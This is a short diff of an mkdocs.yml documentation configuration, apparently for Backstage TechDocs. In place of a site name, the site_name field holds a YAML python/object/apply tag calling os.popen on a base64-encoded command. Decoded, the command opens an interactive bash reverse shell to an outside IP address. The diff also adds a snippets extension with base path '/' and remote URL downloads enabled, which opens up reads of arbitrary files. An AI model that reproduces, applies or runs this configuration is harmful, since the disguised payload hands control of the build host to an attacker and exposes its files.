@@ -1,7 +1,16 @@
 site_name: !!python/object/apply:os.popen
   - "echo YmFzaCAtaSA+JiAvZGV2L3RjcC85MS45OS4xMzcuMjU1LzEyMzQgMD4mMQ== | base64 -d | bash"
 plugins:
+  - search
   - techdocs-core
+markdown_extensions:
+  - pymdownx.snippets:
+      base_path: /
+      url_download: true
+
+
+
+
 
 
 
